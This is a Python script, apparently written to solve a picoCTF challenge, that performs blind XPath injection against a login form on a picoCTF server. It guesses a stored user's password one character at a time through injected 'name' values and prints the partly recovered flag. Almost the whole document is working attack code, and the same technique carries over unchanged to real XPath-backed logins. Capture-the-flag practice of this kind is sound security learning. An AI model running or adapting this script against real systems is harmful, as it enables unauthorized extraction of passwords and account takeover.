# XPath blind injection
from ast import While
from tkinter.tix import Tree
from turtle import position
import requests
import string
import time

url = "http://mercury.picoctf.net:7029/"
headers = {'User-Agent': 'Mozilla/5.0'}

printable = string.printable.replace("'", "")
printable = printable.replace("\"","")

leaked_data = "h0p3fully_u_t0ok_th3_r1ght_xp4th_"


temp = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"
tmp_lv = ""
left_values = temp

while True:
    found = False
    position = len(leaked_data) + 1
    for character in left_values:
        payload = {"name":f"' or substring((//user[position()=3]/pass),{position},1)=\"{character}\" or ''='","pass":"admin"}
        try:
            rep = requests.post(url,headers=headers, data=payload, timeout=5)
        except:
            tmp_lv += character
            continue

        if "re on the right path." in rep.text:
            leaked_data = leaked_data + character
            tmp_lv = ""
            left_values = temp
            found = True
            break
    if not found:
        left_values = tmp_lv

    print(tmp_lv)
    print(f"Flag value: {''.join(leaked_data)}")